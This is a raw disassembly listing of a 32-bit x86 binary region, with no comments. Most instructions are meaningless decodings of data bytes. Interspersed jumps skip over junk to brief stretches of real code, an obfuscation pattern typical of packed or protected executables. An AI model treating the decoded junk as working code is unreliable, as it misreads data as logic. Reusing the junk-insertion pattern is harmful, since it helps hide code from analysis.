  4244b3:	inc    ecx
  4244b4:	mov    bh,0x3
  4244b6:	out    dx,eax
  4244b7:	int3   
  4244b8:	push   cs
  4244b9:	and    DWORD PTR [eax+0x7e],edx
  4244bc:	dec    eax
  4244bd:	clc    
  4244be:	aas    
  4244bf:	push   ecx
  4244c0:	and    edx,DWORD PTR [ecx]
  4244c2:	pop    ebp
  4244c3:	add    al,0x15
  4244c5:	imul   esi,DWORD PTR [edx-0x4df2f7fa],0xd4ebb010
  4244cf:	mov    esp,0xfb04e9e7
  4244d4:	xchg   ebp,eax
  4244d5:	ins    BYTE PTR es:[edi],dx
  4244d6:	mov    BYTE PTR [edi+0x41],dh
  4244d9:	xchg   edi,eax
  4244da:	fs scas al,BYTE PTR es:[edi]
  4244dc:	jge    0x424494
  4244de:	xor    ch,ch
  4244e0:	jle    0x424477
  4244e2:	and    ch,BYTE PTR [ebp-0x369b6377]
  4244e8:	dec    edx
  4244e9:	jecxz  0x42449d
  4244eb:	add    edi,DWORD PTR [eax*2+0x65244dfd]
  4244f2:	mov    DWORD PTR [eax],edi
  4244f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244f5:	sbb    al,0xa6
  4244f7:	fnsave ss:[edi+0x3f]
  4244fb:	test   DWORD PTR [esi],ecx
  4244fd:	add    edi,ebx
  4244ff:	adc    ah,cl
  424501:	(bad)  
  424503:	pop    eax
  424504:	scas   al,BYTE PTR es:[edi]
  424505:	mov    edi,0x969e8ebd
  42450a:	lods   eax,DWORD PTR ds:[esi]
  42450b:	call   0x1024150a
  424510:	mov    edi,0xa6a6be0f
  424515:	fisttp QWORD PTR [edi]
  424517:	jecxz  0x424505
  424519:	imul   esi,DWORD PTR [esi],0x4541416a
  42451f:	loop   0x424545
  424521:	mul    esi
  424523:	dec    esp
  424524:	pop    ss
  424525:	jmp    0x9eec5af1
  42452a:	cdq    
  42452b:	cmp    edx,DWORD PTR [ebx+0x586abfab]
  424531:	adc    dl,BYTE PTR gs:[eax+0x42]
  424535:	mov    ch,0x94
  424537:	mov    ah,0xf6
  424539:	sub    eax,0x2464f72b
  42453e:	sbb    BYTE PTR [ebx+0x24448bc8],cl
  424544:	adc    al,0xf7
  424546:	out    0x3,al
  424548:	ror    DWORD PTR [edi],1
  42454a:	or     al,0x1
  42454d:	add    BYTE PTR [eax],al
  42454f:	cmp    edx,DWORD PTR [esp+0x10]
  424553:	jmp    0x42462a
  424558:	enter  0xa473,0xd6
  42455c:	mov    edi,0xb77ffad7
  424561:	jne    0x424579
  424563:	mov    ebx,0xda91b58c
  424568:	cli    
  424569:	stos   DWORD PTR es:[edi],eax
  42456a:	add    DWORD PTR [eax],eax
  42456c:	mov    edx,0x6d000000
  424571:	mov    esi,0x9d4b5d56
  424576:	ins    DWORD PTR es:[edi],dx
  424577:	clc    
  424578:	push   0x53
  42457a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42457b:	jo     0x4245e1
  42457d:	nop
  42457e:	add    DWORD PTR cs:[edi+0x4332210b],esi
  424585:	or     al,0x4e
  424587:	leave  
  424588:	push   edx
  424589:	dec    eax
  42458a:	and    BYTE PTR [edi-0x6ba9586],cl
  424590:	cmp    al,0x61
  424592:	xchg   ecx,eax
  424593:	ss jns 0x4245ab
  424596:	sbb    DWORD PTR [eax],eax
  424598:	test   BYTE PTR [esi-0x2916ee8e],ch
  42459e:	push   ebx
  42459f:	and    al,0x64
  4245a1:	jle    0x42461e
  4245a3:	dec    ebp
  4245a4:	hlt    
  4245a5:	leave  
  4245a6:	mov    dl,BYTE PTR ds:0xf16d3245
  4245ac:	jmp    0xd890e797
  4245b1:	js     0x4245be
  4245b3:	in     eax,dx
  4245b4:	ins    DWORD PTR es:[edi],dx
  4245b5:	iret   
  4245b6:	in     eax,0x9c
  4245b8:	fs xchg ebx,edi
  4245bb:	mov    ds:0xe78facb3,eax
  4245c0:	fimul  DWORD PTR [ebx-0x21335dc]
  4245c6:	shl    DWORD PTR [edi-0x5fd7739f],0x19
  4245cd:	jmp    0x41d33283
  4245d2:	out    0x8,eax
  4245d4:	repnz std 
  4245d6:	test   eax,0xc84aa7f0
  4245db:	sub    eax,0xa76787e2
  4245e0:	and    al,0x4d
  4245e2:	jp     0x4245cd
  4245e4:	stos   BYTE PTR es:[edi],al
  4245e5:	xchg   DWORD PTR [edi],ebp
  4245e7:	inc    edx
  4245e8:	adc    BYTE PTR [ebp-0x54ded455],dl
  4245ee:	xchg   bl,ch
  4245f0:	fimul  DWORD PTR [edx+ebp*2-0x62]
  4245f4:	mov    ch,0xfa
  4245f6:	inc    ebp
  4245f7:	test   bl,0xc
  4245fa:	mov    cl,0x1e
  4245fc:	popf   
  4245fd:	and    edx,edi
  4245ff:	mov    ebp,0xfabecb24
  424604:	mov    edi,0xc4a730da
  424609:	add    al,0x5
  42460b:	iret   
  42460c:	or     DWORD PTR [edx],esp
  42460e:	mov    edx,0x5174c1a2
  424613:	fadd   DWORD PTR [eax]
  424615:	push   eax
  424616:	xor    al,BYTE PTR [ebx+0x2]
  424619:	inc    edi
  42461a:	adc    ah,BYTE PTR [edi]
  42461c:	inc    eax
  42461d:	push   esi
  42461e:	loopne 0x4245e1
  424620:	xlat   BYTE PTR ds:[ebx]
  424621:	mov    dl,0x14
  424623:	scas   eax,DWORD PTR es:[edi]
  424624:	mov    ds:0x3f0e697f,al
  424629:	(bad)  
  42462a:	ja     0x424717
  424630:	jmp    0x424707
  424635:	enter  0x3753,0x56
  424639:	mov    edi,0x69dfe976
  42463e:	or     DWORD PTR [esi+0x69],0x6c
  424642:	cs inc ecx
  424644:	or     eax,0x1acb4
  424649:	mov    edx,0xed000000
  42464e:	js     0x4245d9
  424650:	mov    esi,0x1122790d
  424655:	sbb    BYTE PTR [esi],al
  424657:	jle    0x4246b6
  424659:	jecxz  0x424604
  42465b:	es fs mov esp,es
  42465f:	pushf  
  424660:	adc    al,0xa4
  424662:	cs (bad) 
  424664:	nop
  424665:	mov    eax,ds:0xa904aec0
  42466a:	xlat   BYTE PTR ds:[ebx]
  42466b:	les    edx,FWORD PTR [edi+edx*8]
  42466e:	ficomp WORD PTR [esp+esi*1+0x3c30a4db]
  424675:	fiadd  WORD PTR [ebx+0x40]
  424678:	mov    esi,0xe9329f82
  42467d:	cld    
  42467e:	popf   
  42467f:	les    edi,FWORD PTR [esi]
  424681:	scas   al,BYTE PTR es:[edi]
  424682:	xor    al,0x67
  424684:	inc    eax
  424685:	popa   
  424686:	sbb    ecx,DWORD PTR [ebp+0x12]
  424689:	fs pushf 
  42468b:	pop    edi
  42468c:	push   0xd331f213
  424691:	xchg   ebp,eax
  424692:	leave  
  424693:	or     eax,0x1332cc36
  424698:	mov    al,ds:0x533113f
  42469d:	cmp    esp,ecx
  42469f:	xchg   DWORD PTR [ebp-0x6b581e6],edx
  4246a5:	test   al,0x51
  4246a7:	enter  0xe754,0x1c
  4246ab:	je     0x42463d
  4246ad:	jno    0x42470a
  4246af:	push   ecx
  4246b0:	lea    eax,[ebx+ebp*8-0x13]
  4246b4:	loope  0x424695
  4246b6:	add    al,BYTE PTR [eax]
  4246b8:	in     al,0x35
  4246ba:	jmp    0x42464e
  4246bc:	xor    DWORD PTR [ebp-0x681533c8],0xfffffff2
  4246c3:	dec    ecx
  4246c4:	jno    0x42470a
  4246c6:	lds    esi,FWORD PTR ds:0xd49a02af
  4246cc:	es pop edx
  4246ce:	mov    WORD PTR [edx],ss
  4246d0:	cmc    
  4246d1:	mov    BYTE PTR [ebx-0x9dfbf],ch
  4246d7:	add    eax,0xc3059a46
  4246dc:	lahf   
  4246dd:	icebp  
  4246de:	mov    al,ds:0x20e14ba5
  4246e3:	push   esp
  4246e4:	inc    ebx
  4246e5:	sbb    dl,ch
  4246e7:	mov    ebp,0x5dbeeb31
  4246ec:	xlat   BYTE PTR ds:[ebx]
  4246ed:	jle    0x424706
  4246ef:	mov    ebx,0x4d9ad0d1
  4246f4:	scas   al,BYTE PTR es:[edi]
  4246f5:	cmp    BYTE PTR [eax],dl
  4246f7:	lock cmp DWORD PTR [esp+esi*8-0x42576966],edx
  4246ff:	and    eax,0x258f2c5a
  424704:	fld    QWORD PTR [eax-0x16]
  424707:	jb     0x424718
  42470d:	cmp    eax,DWORD PTR [esp+0xc]
  424711:	jbe    0x424718
  424717:	dec    esi
  424718:	xor    edx,edx
  42471a:	jmp    0x4247f1
  42471f:	scas   al,BYTE PTR es:[edi]
  424720:	push   ebx
  424721:	mov    edi,0xbfecff8c
  424726:	jae    0x424721
  424728:	pushf  
  424729:	loopne 0x424763
  42472b:	loopne 0x424714
  42472d:	adc    ecx,DWORD PTR [edi]
  42472f:	outs   dx,BYTE PTR ds:[esi]
  424730:	lods   eax,DWORD PTR ds:[esi]
  424731:	add    DWORD PTR [eax],eax
  424733:	mov    edx,0xce000000
  424738:	pop    eax
  424739:	dec    ebp
  42473a:	cmp    BYTE PTR [edx+0xb],dh
  42473d:	mov    bl,0xdd
  42473f:	nop
  424740:	enter  0xc7b3,0x79
  424744:	repz sub BYTE PTR [ebp+0x7e1f2cd3],bl
  42474b:	sub    eax,0x1408137f
  424750:	sub    dh,al
  424752:	stc    
  424753:	ins    BYTE PTR es:[edi],dx
  424754:	loopne 0x424729
  424756:	jl     0x424734
  424758:	int    0x5
  42475a:	sbb    al,0xe8
  42475c:	push   edi
  42475d:	xlat   BYTE PTR ds:[ebx]
  42475e:	jb     0x42470e
  424760:	mov    eax,0xc5ae4ae8
  424765:	xchg   BYTE PTR [ecx+eiz*4+0x75c95cbe],ch
  42476c:	clc    
  42476d:	xor    eax,0xeb3d013d
  424772:	sar    BYTE PTR [eax-0x80],cl
  424775:	ret    
  424776:	das    
  424777:	and    eax,0x9d340293
  42477c:	add    al,0xc1
  42477e:	add    ecx,ebp
  424780:	test   eax,0x386d0699
  424785:	jne    0x4247a4
  424787:	clc    
  424788:	jl     0x424801
  42478a:	pop    es
  42478b:	ds pop es
  42478d:	mov    dh,ah
  42478f:	int3   
  424790:	mov    bh,0x18
  424792:	ss and al,0x10
  424795:	adc    BYTE PTR [ecx+0x43],0x40
  424799:	mov    eax,ds:0xbf39b8a2
  42479e:	and    BYTE PTR [edx+0x2277bf94],ah
  4247a4:	mov    al,0xa0
  4247a6:	jge    0x4247e5
  4247a8:	bound  ebp,QWORD PTR [eax-0x55]
  4247ab:	shl    BYTE PTR [edx+0x9907e5e],cl
  4247b1:	lods   al,BYTE PTR ds:[esi]
  4247b2:	pop    ds
  4247b3:	mov    esi,0xd8975418
  4247b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247b9:	xchg   esi,eax
  4247ba:	rcl    BYTE PTR [edx+0x2d],0x3b
  4247be:	cmp    ecx,DWORD PTR [esi+0x3b]
  4247c1:	and    al,0x7c
  4247c3:	cmp    eax,0x1b41a724
  4247c8:	es or  al,0x29
  4247cb:	dec    ebp
  4247cc:	es adc ecx,eax
  4247cf:	cmp    BYTE PTR [edi-0x76d064d2],bh
  4247d5:	fistp  QWORD PTR [ecx-0x32]
  4247d8:	ficomp WORD PTR [esi-0x518642fd]
  4247de:	or     ah,bl
  4247e0:	out    dx,al
  4247e1:	mov    ds:0xd718d77f,al
  4247e6:	mov    dh,0x11
  4247e8:	sub    ebp,DWORD PTR [edx]
  4247ea:	fstp   DWORD PTR [edi+ebp*2-0x2cddd179]
  4247f1:	mov    eax,esi
  4247f3:	jmp    0x4248ca
  4247f8:	iret   
  4247f9:	fstp   DWORD PTR [ecx]
  4247fb:	nop
  4247fc:	pop    ds
  4247fd:	ror    bh,1
  4247ff:	(bad)  
  424801:	push   esp
  424802:	xor    eax,0xa88498c7
  424807:	outs   dx,BYTE PTR ds:[esi]
  424808:	sub    BYTE PTR [esi+0xba0001],ch
  42480e:	add    BYTE PTR [eax],al
  424810:	cmp    al,dl
  424812:	mov    esp,DWORD PTR [esi]
  424814:	dec    edi
  424815:	sub    al,0xf5
  424817:	or     al,0x79
  424819:	jno    0x4247af
  42481b:	or     ah,ah
  42481d:	loopne 0x424864
  42481f:	std    
  424820:	shl    DWORD PTR ss:[ecx+0x2e],cl
  424824:	call   0x2440120d
  424829:	or     BYTE PTR [ebp+0x29c482b0],dh
  42482f:	mov    ch,0x34
  424831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424832:	push   0xffffff85
  424834:	push   ecx
  424835:	scas   eax,DWORD PTR es:[edi]
  424836:	add    eax,DWORD PTR [eax+0x5d]
  424839:	iret   
  42483a:	mov    ah,0x70
  42483c:	gs aam 0xfa
  42483f:	shl    DWORD PTR [esi],1
  424841:	and    eax,0xd2d90a40
  424846:	xor    DWORD PTR [edx-0x2c808ff0],0x74b50787
  424850:	push   ds
  424851:	je     0x4248cd
  424853:	xlat   BYTE PTR ds:[ebx]
  424854:	hlt    
  424855:	pop    esp
  424856:	outs   dx,DWORD PTR ds:[esi]
  424857:	xchg   BYTE PTR [ebp-0xe06102c],bl
  42485d:	jecxz  0x424809
  42485f:	adc    DWORD PTR [eax-0x5989d827],0x25
  424866:	jl     0x424859
  424868:	mov    edx,0x90b4b2fb
  42486d:	fsubr  st,st(5)
  42486f:	cmp    ch,BYTE PTR [eax+0x2bc0657c]
  424875:	call   0x8eda3b22
  42487a:	mov    ch,0xae
  42487c:	sahf   
  42487d:	sbb    DWORD PTR [edi-0x4e],0xe029b0c8
  424884:	push   edi
  424885:	mov    esp,0xe4ae5326
  42488a:	xchg   edi,eax
  42488b:	loope  0x4248bb
  42488d:	mov    esp,DWORD PTR [edi+0x2]
  424890:	imul   ebp,DWORD PTR [edx+edi*2+0x253950ca],0x50db938e
  42489b:	cmp    ebp,edi
  42489d:	xor    ch,dl
  42489f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248a0:	sar    DWORD PTR [eax+0x74d96f6c],cl
  4248a6:	push   edx
  4248a7:	out    dx,eax
  4248a8:	out    dx,al
  4248a9:	retf   0xeea5
  4248ac:	daa    
  4248ad:	add    al,0x67
  4248af:	and    eax,DWORD PTR [esi+eiz*1]
  4248b2:	test   al,0xd1
  4248b4:	xchg   esi,eax
  4248b5:	xchg   ecx,eax
  4248b6:	sbb    edi,ebp
  4248b8:	or     cl,BYTE PTR [esi+eiz*8]
  4248bb:	lds    ebx,FWORD PTR [ebx-0x5763c134]
  4248c1:	sahf   
  4248c2:	adc    BYTE PTR [eax-0x18],dl
  4248c5:	jne    0x42486e
  4248c7:	pop    es
  4248c8:	mov    dh,0x72
  4248ca:	pop    esi
  4248cb:	jmp    0x4249a2
  4248d0:	sub    eax,0x98b018b5
  4248d5:	mov    ebp,0x194cbdad
  4248da:	lds    esi,FWORD PTR [ebx]
  4248dc:	and    DWORD PTR [ecx+edx*2+0x4e],edx
  4248e0:	loop   0x424890
  4248e2:	add    DWORD PTR [eax],eax
  4248e4:	mov    edx,0xfe000000
  4248e9:	rol    DWORD PTR [esi-0x29594752],cl
  4248ef:	mov    al,0x61
  4248f1:	jns    0x4248ec
  4248f3:	scas   eax,DWORD PTR es:[edi]
  4248f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248f5:	push   es
  4248f6:	jae    0x42493a
  4248f8:	mov    edx,0x18a259f0
  4248fd:	popa   
  4248fe:	jae    0x4248b6
  424900:	lods   eax,DWORD PTR ds:[esi]
  424901:	adc    al,0x8a
  424903:	fwait
  424904:	jno    0x424904
  424906:	leave  
  424907:	add    esp,ecx
  424909:	mov    ch,0x9c
  42490b:	mov    al,0x7b
  42490d:	dec    ebp
  42490e:	fstp   TBYTE PTR [edi-0x18]
  424911:	out    dx,al
  424912:	mov    dl,0x6
  424914:	and    bl,BYTE PTR [esi+0x52c5210b]
  42491a:	js     0x424982
  42491c:	xor    eax,0x3b7c598b
  424921:	cwde   
  424922:	or     eax,0x53cb943f
  424927:	pop    edx
  424928:	lock jle 0x4248e9
  42492b:	dec    eax
  42492c:	pop    esp
  42492d:	scas   eax,DWORD PTR es:[edi]
  42492e:	mov    edx,0xfc1e13a7
  424933:	fild   QWORD PTR [esi+ebp*8-0x4d]
  424937:	mov    BYTE PTR [edx],bl
  424939:	(bad)  
  42493b:	(bad)  
  42493c:	and    ah,bh
  42493e:	out    dx,eax
  42493f:	dec    eax
  424940:	adc    ah,dl
  424942:	jp     0x4248f6
  424944:	stc    
  424945:	lahf   
  424946:	dec    edx
  424947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424948:	or     edi,DWORD PTR [ebp+0x43]
  42494b:	inc    eax
  42494c:	ret    
  42494d:	pop    ss
  42494e:	fwait
  42494f:	aad    0x91
  424951:	addr16 jbe 0x42498d
  424954:	daa    
  424955:	inc    edi
  424956:	mov    cl,0xd0
  424958:	(bad)  
  424959:	arpl   WORD PTR [edx+0x3b77f81f],ax
  42495f:	or     BYTE PTR [bx+si+0x2e],al
  424964:	or     BYTE PTR [esp+edx*4+0x2f],dl
  424968:	mov    dh,0xa4
  42496a:	loopne 0x42496a
  42496c:	(bad)  
  42496d:	mov    ds:0xa808eee5,eax
  424972:	pushf  
  424973:	mov    edx,0x997d10c0
  424978:	retf   0x6d0b
  42497b:	outs   dx,BYTE PTR ds:[esi]
  42497c:	push   edi
  42497d:	sbb    dl,BYTE PTR ds:[esi]
  424980:	js     0x4249df
  424982:	cs clc 
  424984:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424985:	and    bl,BYTE PTR [edx-0x25]
  424988:	add    DWORD PTR [ecx],esp
  42498a:	mov    eax,0xa128ddbb
  42498f:	mov    ch,0xf1
  424991:	out    0x58,eax
  424993:	std    
  424994:	les    ebp,FWORD PTR [edx-0x445c9e25]
  42499a:	lahf   
  42499b:	ficom  WORD PTR [ebp-0x66]
  42499e:	mov    eax,ds:0x5b8ab0b9
  4249a3:	ret    0x10
  4249a6:	push   ebp
  4249a7:	mov    ebp,esp
  4249a9:	sub    esp,0x38
  4249ac:	push   ebx
  4249ad:	jmp    0x424a72
  4249b2:	or     ecx,0xffffffec
  4249b5:	inc    edi
  4249b6:	out    dx,al
  4249b7:	stos   DWORD PTR es:[di],eax
  4249b9:	int    0x94
  4249bb:	cli    
  4249bc:	stos   BYTE PTR es:[edi],al
  4249bd:	mov    eax,ds:0x333d252e
  4249c2:	pushf  
  4249c3:	scas   eax,DWORD PTR es:[edi]
  4249c4:	add    DWORD PTR [eax],eax
  4249c6:	test   al,0x0
  4249c8:	add    BYTE PTR [eax],al
  4249ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249cb:	sbb    eax,0xfeafd2
  4249d0:	xchg   esp,eax
  4249d1:	push   0xffffff8b
  4249d3:	fwait
  4249d4:	push   ebx
  4249d5:	jl     0x424957
  4249d7:	in     al,dx
  4249d8:	ins    BYTE PTR es:[edi],dx
  4249d9:	imul   BYTE PTR [ebp+0xcbf68a5]
  4249df:	pop    ebx
  4249e0:	std    
  4249e1:	sub    esi,esi
  4249e3:	and    BYTE PTR [esi+esi*4],bl
  4249e6:	mov    esp,0xb8c30eb6
  4249eb:	mov    WORD PTR [eax-0x1e69cbe0],gs
  4249f1:	pop    esi
  4249f2:	xor    al,0x85
  4249f4:	sub    al,dh
  4249f6:	xor    bh,BYTE PTR [edx+0x3d333c66]
  4249fc:	xor    edx,DWORD PTR [ecx]
  4249fe:	and    bl,cl
  424a00:	cmp    eax,0xf45e0b2a
  424a05:	(bad)  
  424a06:	ins    BYTE PTR es:[edi],dx
  424a07:	test   al,0x57
  424a09:	cmp    al,0x8b
  424a0b:	repnz pop ecx
  424a0d:	in     eax,0x3a
  424a0f:	jp     0x424a2a
  424a11:	outs   dx,BYTE PTR ds:[esi]
  424a12:	in     al,dx
  424a13:	call   0x80b81ce6
  424a18:	xchg   bl,dl
  424a1a:	fmul   QWORD PTR [ecx]
  424a1c:	fsub   st(4),st
  424a1e:	out    0xaf,al
  424a20:	and    eax,0xe273337f
  424a25:	xchg   ebx,eax
  424a26:	dec    esp
  424a27:	add    al,0xbb
  424a29:	cli    
  424a2a:	sbb    cl,BYTE PTR [edi-0x59e30bd5]
  424a30:	push   eax
  424a31:	mov    al,0x8e
  424a33:	mov    dl,0x10
  424a35:	add    ecx,DWORD PTR [esi+0xd]
  424a38:	call   0x4891c18c
  424a3d:	scas   eax,DWORD PTR es:[edi]
  424a3e:	mov    edx,0x1f7f500c
  424a43:	int3   
  424a44:	mov    ebx,0x7883a3ff
  424a49:	xor    BYTE PTR [edx],bh
  424a4b:	(bad)  
  424a4c:	lods   al,BYTE PTR ds:[esi]
  424a4d:	mov    ch,0x20
  424a4f:	loopne 0x424ad0
  424a51:	ja     0x424a9e
  424a53:	(bad)  
  424a54:	xlat   BYTE PTR ds:[ebx]
  424a55:	and    bh,ah
  424a57:	lahf   
  424a58:	sbb    BYTE PTR [ecx-0x5527dab5],dh
  424a5e:	lds    edx,FWORD PTR [ebx-0x75d3dab6]
  424a64:	pushf  
  424a65:	cli    
  424a66:	std    
  424a67:	or     esp,DWORD PTR es:[ebx]
  424a6a:	ja     0x424ac9
  424a6c:	sbb    al,0x85
  424a6e:	sbb    al,0x76
  424a70:	ins    BYTE PTR es:[edi],dx
  424a71:	push   eax
  424a72:	push   esi
  424a73:	push   edi
  424a74:	mov    DWORD PTR [ebp-0xc],0xb89
  424a7b:	mov    DWORD PTR [ebp-0x8],0x79d
  424a82:	mov    DWORD PTR [ebp-0x4],0x1206
  424a89:	mov    DWORD PTR [ebp-0x1c],0x5d18
  424a90:	mov    DWORD PTR [ebp-0x18],0x507f
  424a97:	mov    DWORD PTR [ebp-0x14],0x1787
  424a9e:	mov    DWORD PTR [ebp-0x10],0x5eb4
  424aa5:	mov    DWORD PTR [ebp-0x38],0x3718
  424aac:	mov    DWORD PTR [ebp-0x34],0x6bad
  424ab3:	jmp    0x424b78
  424ab8:	jae    0x424aad
  424aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424abb:	cmp    esp,DWORD PTR [edi-0x3c040081]
  424ac1:	mov    edi,0x9833656a
  424ac6:	mov    ecx,0x1b04470
  424acb:	add    BYTE PTR [eax+0x1b000000],ch
  424ad1:	ja     0x424b0f
  424ad3:	jb     0x424a96
  424ad5:	or     eax,DWORD PTR [edi-0x1e]
  424ad8:	shr    BYTE PTR [edi],1
  424ada:	ss sbb cl,dl
  424add:	mov    edi,0x2073ef51
  424ae2:	xchg   esp,eax
  424ae4:	(bad)  
  424ae5:	mov    cl,0xf3
  424ae7:	jecxz  0x424ad0
  424ae9:	inc    eax
  424aea:	jne    0x424b5b
  424aec:	in     al,0xc6
  424aee:	clc    
  424aef:	mov    dh,0x4d
  424af1:	pop    edi
  424af2:	leave  
  424af3:	in     eax,dx
  424af4:	cs fs jb 0x424b4a
  424af8:	push   ebx
  424af9:	jl     0x424b13
  424afb:	stc    
  424afc:	push   0xce2c8ffd
  424b01:	shl    DWORD PTR [ebp+ecx*4-0x57ae3484],0x1
  424b09:	inc    ecx
  424b0a:	cwde   
  424b0b:	aaa    
  424b0c:	sub    al,bl
  424b0e:	mov    dl,dh
  424b10:	push   esi
  424b11:	loop   0x424ad4
  424b13:	rep outs dx,DWORD PTR ds:[esi]
  424b15:	ins    BYTE PTR es:[edi],dx
  424b16:	and    ch,BYTE PTR [ebx+ecx*4]
  424b19:	or     BYTE PTR [eax],al
  424b1b:	push   es
  424b1c:	cdq    
  424b1d:	ins    DWORD PTR es:[edi],dx
  424b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b1f:	in     eax,0x7c
  424b21:	mov    esi,ebp
  424b23:	mov    WORD PTR [ebp+0x61f1c0a7],gs
  424b29:	add    DWORD PTR ds:[edi],esi
  424b2c:	push   edi
  424b2d:	fdivp  st(1),st
  424b2f:	xchg   esp,eax
  424b30:	call   0x901d:0xb82b8223
  424b37:	ds jne 0x424b33
  424b3a:	repnz int 0x23
  424b3d:	push   ds
  424b3e:	jnp    0x424b07
  424b40:	out    dx,al
  424b41:	les    edi,FWORD PTR [ebp+0x6d]
  424b44:	push   ebx
  424b45:	inc    eax
  424b46:	shl    DWORD PTR [eax],cl
  424b48:	xor    BYTE PTR [edx],bl
  424b4a:	fmul   QWORD PTR [edx+0x5fd31969]
  424b50:	pusha  
  424b51:	mov    edx,0x69ae51ec
  424b56:	shl    DWORD PTR [esi],1
  424b58:	je     0x424b0e
  424b5a:	add    eax,0xc9a5637c
  424b5f:	jle    0x424b21
  424b61:	loopne 0x424b8f
  424b63:	and    al,0xb1
  424b65:	sbb    edi,DWORD PTR [edx+0x2572eff8]
  424b6b:	adc    al,0x36
  424b6d:	xor    al,0xd4
  424b6f:	retf   
  424b70:	push   ebx
  424b71:	dec    ecx
  424b72:	inc    esi
  424b73:	(bad)  
  424b74:	adc    eax,0xc7b036d0
  424b79:	inc    ebp
  424b7a:	rcl    BYTE PTR [eax],1
  424b7c:	add    BYTE PTR [eax],al
  424b7e:	add    bh,al
  424b80:	inc    ebp
  424b81:	aam    0xbe
  424b83:	and    al,BYTE PTR [eax]
  424b85:	add    bh,al
  424b87:	inc    ebp
  424b88:	fcom   st(5)
  424b8a:	add    eax,DWORD PTR [eax]
  424b8c:	add    cl,ch
  424b8e:	rol    BYTE PTR [eax],0x0
  424b91:	add    BYTE PTR [esi+0x27],dh
  424b94:	mov    eax,0xfebff924
  424b99:	ja     0x424b4b
  424b9b:	retf   0xe457
  424b9e:	loope  0x424bec
  424ba0:	and    al,0x65
  424ba2:	in     al,dx
  424ba3:	mov    al,0x1
  424ba5:	add    BYTE PTR [eax-0x54000000],ch
  424bab:	das    
  424bac:	adc    BYTE PTR [edi],dl
  424bae:	mov    DWORD PTR [edi-0x5b],ebp
  424bb1:	xchg   DWORD PTR [ebp+0x49dd9a40],edi
  424bb7:	iret   
  424bb8:	sub    al,0x15
  424bba:	fst    DWORD PTR [ebx+0x11]
  424bbd:	(bad)  
  424bbe:	data16 and dl,ah
  424bc1:	jne    0x424bd0
  424bc3:	vpmulhuw xmm7,xmm2,xmm7
  424bc7:	inc    eax
  424bc8:	cmp    BYTE PTR [esi+0x42db95e4],0x23
  424bcf:	mov    ds:0x72344481,al
  424bd4:	jo     0x424bbf
  424bd6:	xor    DWORD PTR [esi],ecx
  424bd8:	jmp    0x424b94
  424bda:	es inc ecx
  424bdc:	fs inc esi
  424bde:	sbb    al,BYTE PTR [edx+0xd677fab]
  424be4:	cld    
  424be5:	cli    
  424be6:	sub    ecx,DWORD PTR [edx-0x6db97c9b]
  424bec:	mov    ds:0xf05e843d,al
  424bf1:	ficomp DWORD PTR [ecx-0xc3ff671]
  424bf7:	xchg   edx,eax
  424bf8:	sbb    DWORD PTR [ebx+0x1851f337],esp
  424bfe:	je     0x424bbe
  424c00:	in     eax,dx
  424c01:	add    BYTE PTR [eax-0x36906ca3],dh
  424c07:	in     eax,0xa9
  424c09:	in     eax,dx
  424c0a:	cmp    DWORD PTR [eax],ecx
  424c0c:	pop    es
  424c0d:	int3   
  424c0e:	and    DWORD PTR [ebx-0x4a398b10],0x1b
  424c15:	dec    eax
  424c16:	or     al,0x5f
  424c18:	jbe    0x424bb3
  424c1a:	cmp    DWORD PTR [esp+eax*4+0x10f7d4b2],ebx
  424c21:	push   cs
  424c22:	jg     0x424bef
  424c24:	retf   0x3e96
  424c27:	call   0x24773f28
  424c2c:	mov    esp,0x86c400c3
  424c31:	(bad)  
  424c33:	out    dx,eax
  424c34:	mov    edx,0x2de37071
  424c39:	mov    bh,0xd
  424c3b:	xchg   BYTE PTR ds:0x855c6a16,al
  424c41:	aad    0xf2
  424c43:	mov    ebx,0x2264580a
  424c48:	repz fst DWORD PTR cs:[edi+edx*4-0x3e570292]
  424c51:	jbe    0x424c1a
  424c53:	inc    ebp
  424c54:	fsub   QWORD PTR [esi-0x16fffffe]
  424c5a:	rol    BYTE PTR [eax],0x0
  424c5d:	add    BYTE PTR [esi],bl
  424c5f:	mov    bh,0x9e
  424c61:	pop    ebx
  424c62:	mov    edi,0x8f7df7b
  424c67:	std    
  424c68:	adc    al,0x33
  424c6a:	outs   dx,DWORD PTR ds:[esi]
  424c6b:	push   ecx
  424c6c:	pop    ss
  424c6d:	lahf   
  424c6e:	xchg   esp,eax
  424c6f:	mov    cl,0x1
  424c71:	add    BYTE PTR [eax+0x53000000],ch
  424c77:	jne    0x424cc3
  424c79:	mov    bh,0x8d
  424c7b:	jmp    0xf647:0x380ea137
  424c82:	aad    0x49
  424c84:	add    eax,0x630570fb
  424c89:	push   ebx
  424c8a:	sbb    BYTE PTR [edx],dh
  424c8c:	mov    ch,0xef
  424c8e:	test   al,0x9
  424c90:	ror    BYTE PTR [ebp+0x699d99e6],cl
  424c96:	ins    BYTE PTR es:[edi],dx
  424c97:	adc    ah,BYTE PTR [ecx+0x6d320374]
  424c9d:	dec    esp
  424c9e:	iret   
  424c9f:	add    eax,0x44ea3771
  424ca4:	scas   al,BYTE PTR es:[edi]
  424ca5:	jnp    0x424cbb
  424ca7:	data16 aas 
  424ca9:	ret    0xdd7e
  424cac:	fdivr  DWORD PTR [esp+edx*8-0x68c4af27]
  424cb3:	nop
  424cb4:	cli    
  424cb5:	(bad)  
  424cb6:	in     al,0xea
  424cb8:	icebp  
  424cb9:	xor    eax,0x111f2481
  424cbe:	sub    ebx,DWORD PTR [eax-0x29183095]
  424cc4:	inc    edx
  424cc5:	pop    ss
  424cc6:	add    BYTE PTR [edi+0x7fbc817],cl
  424ccc:	shr    BYTE PTR [ebp-0x2e],cl
  424ccf:	push   ebx
  424cd0:	cmp    BYTE PTR [esi+0x122ca916],ah
  424cd6:	adc    bh,bh
  424cd8:	xchg   esi,eax
  424cd9:	ror    BYTE PTR [edx],1
